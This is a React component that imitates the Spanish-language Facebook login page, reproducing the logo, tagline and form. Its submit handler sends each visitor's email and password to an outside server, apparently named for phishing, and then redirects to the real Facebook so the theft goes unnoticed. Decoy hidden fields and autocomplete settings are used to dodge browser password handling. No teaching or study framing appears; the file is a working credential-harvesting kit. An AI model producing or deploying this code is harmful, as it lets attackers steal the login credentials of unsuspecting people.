import { useState } from "react";
import "./LoginFacebook.css";

function FacebookLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = (e: any) => {
    e.preventDefault();

    const data = {
      correo_electronico: email,
      contrasena: password
    };

    fetch("https://pishing-xi.vercel.app/cuentas-facebook", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    })
      .then((res) => {
        if (!res.ok) {
          throw new Error("Error en la solicitud");
        }
        return res.json();
      })
      .then((responseData) => {
        if (responseData.message === "Cuenta registrada correctamente") {
          alert("Inicio de sesión exitoso");
          window.location.href = "https://facebook.com";
        } else {
          console.log("Respuesta del servidor:", responseData);
          alert("Inicio de sesión fallido");
        }
      })
      .catch((err) => {
        console.error("Error al iniciar sesión", err);
      });
  };

  return (
    <div className="login-container">
      <div className="login-wrapper">
        {/* Left side */}
        <div className="login-left">
          <div className="facebook-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1022.51 360">
              <path
                d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3h-23.16v76.78H125.38V181.36H103.9v-25.3h21.48V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"
                fill="#1877f2"
              />
              <path
                d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"
                fill="#1877f2"
              />
              <path
                d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"
                fill="#1877f2"
              />
              <path
                d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"
                fill="#1877f2"
              />
              <path
                d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"
                fill="#1877f2"
              />
              <path
                d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"
                fill="#1877f2"
              />
              <path
                d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"
                fill="#1877f2"
              />
              <path
                d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"
                fill="#1877f2"
              />
            </svg>
          </div>
          <h2 className="tagline">
            Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
          </h2>
        </div>

        {/* Right side with login form */}
        <div className="login-right">
          <div className="login-form-container">
            <form className="login-form" onSubmit={handleSubmit} autoComplete="off">
              <input
                type="text"
                name="fake_username"
                style={{ display: "none" }}
                autoComplete="username"
              />
              <input
                type="password"
                name="fake_password"
                style={{ display: "none" }}
                autoComplete="new-password"
              />

              <input
                type="text"
                name="email_fake" // nombre falso evita sugerencias
                placeholder="Correo electrónico o número de teléfono"
                className="login-input"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoComplete="off"
              />
              <input
                type="password"
                name="password_fake"
                placeholder="Contraseña"
                className="login-input"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoComplete="new-password"
              />
              <button type="submit" className="login-button">
                Iniciar sesión
              </button>
              <div className="forgot-password">
                <a href="#" className="forgot-link">
                  ¿Olvidaste tu contraseña?
                </a>
              </div>
              <div className="divider"></div>
              <div className="create-account-container">
                <button type="button" className="create-account-button">
                  Crear cuenta nueva
                </button>
              </div>
            </form>
          </div>
          <p className="create-page-text">
            <a href="#" className="create-page-link">
              Crea una página
            </a>{" "}
            para una celebridad, una marca o un negocio.
          </p>
        </div>
      </div>
    </div>
  );
}

export default FacebookLogin;
